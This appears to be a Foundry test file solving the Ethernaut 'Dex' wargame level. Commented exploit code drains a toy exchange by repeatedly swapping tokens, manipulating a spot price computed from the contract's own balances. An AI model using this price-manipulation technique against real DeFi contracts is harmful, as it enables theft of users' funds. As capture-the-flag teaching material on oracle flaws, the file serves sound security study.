// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Dex.sol";
import "src/levels/DexFactory.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestDex is BaseTest {
    Dex private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Dex(levelAddress);

        // Check that the contract is correctly setup

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // The challenge start with the Dex (level) with 100 token1 and 100 token2 in its balance
        // We start with 10 token1 and 10 token2
        // Our goal is to be able to get all the token1 or token2 from the Dex

        // In this challenge we will not attack the contract directly
        // but we will find a way to buy one of the token for a smaller price or even zero
        // These kind of attacks are called "price manipulation" and are unfortunately still present
        // in the crypto scene
        // If you want to know more about the price manipulation attacks and how to prevent them
        // I highly encourage you to read these articles ->
        // - OpenZeppelin: The Dangers of Price Oracles in Smart Contracts https://www.youtube.com/watch?v=YGO7nzpXCeA
        // - OpenZeppelin: Smart Contract Security Guidelines #3: The Dangers of Price Oracles https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/
        // - samczsun: So you want to use a price oracle https://samczsun.com/so-you-want-to-use-a-price-oracle/
        // - cmichel: Pricing LP tokens | Warp Finance hack https://cmichel.io/pricing-lp-tokens/

        // Now let's get back to our challenge
        // If we look at the `Dex` contract we see that the price to swap a token is determined
        // by the function `getSwapPrice`. Here is the formula:
        // `((amount * IERC20(tokenOut).balanceOf(address(this))) / IERC20(tokenIn).balanceOf(address(this)))`
        // This formula tells you how many `tokenOut` tokens are you going to get when you send `amount` of `tokenIn` tokens
        // Basically lower is the balance of `tokenIn` (compared to the balance of `tokenOut`)  (token you are selling), higher is the amount of `tokenOut`
        // This Dex does not use an external Oracle or Uniswap TWAP (time weighted average price) to calculate
        // the swap price. Instead it is using the balance of the token to calculate it and we can leverage this
        // In Solidity there is a known problem called "rounding error". This problem is introduced by the fact that
        // all integer division rounds down to the nearest integer. This mean if you do `5/2` the result is not `2.5` but `2`
        // To make an example, if we sell 1 token1 but token2*amount < token1 we will get 0 token2 back!
        // Basically we are selling token to get zero back!

        // Approve the dex to manage all of our token
        token1.approve(address(level), 2**256 - 1);
        token2.approve(address(level), 2**256 - 1);

        // To drain the dex our goal is to make the balance of `tokenIn` much lower compared to balance of tokenOut
        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);

        // After all these swaps the current situation is like this
        // Player Balance of token1 -> 0
        // Player Balance of token2 -> 65
        // Dex Balance of token1 -> 110
        // Dex Balance of token2 -> 45
        // If we tried to swap all the 65 token2 we would get back 158 token1
        // but the transaction would fail because the Dex does not have enough
        // balance to execute the transfer
        // So we need to calculate the amount of token2 to sell in order to get back 110 token1
        // 110 token1 = amountOfToken2ToSell * DexBalanceOfToken1 / DexBalanceOfToken2
        // 110 = amountOfToken2ToSell * 110 / 45
        // amountOfToken2ToSell = 45

        level.swap(address(token2), address(token1), 45);

        assertEq(token1.balanceOf(address(level)) == 0 || token2.balanceOf(address(level)) == 0, true);

        vm.stopPrank();
    }

    function swapMax(ERC20 tokenIn, ERC20 tokenOut) public {
        level.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(player));
    }
}
